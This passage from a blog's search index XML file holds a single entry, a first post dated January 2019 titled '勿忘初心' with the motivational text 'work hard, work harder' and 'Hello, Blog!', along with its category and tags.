  </entry>
  <entry>
    <title><![CDATA[勿忘初心]]></title>
    <url>%2F2019%2F01%2F18%2F2019%2F</url>
    <content type="text"><![CDATA[努力努力再努力Hello,Blog!]]></content>
      <categories>
        <category>勿忘初心</category>
      </categories>
      <tags>
        <tag>努力努力再努力</tag>
        <tag>小维同学</tag>
      </tags>
  </entry>
</search>
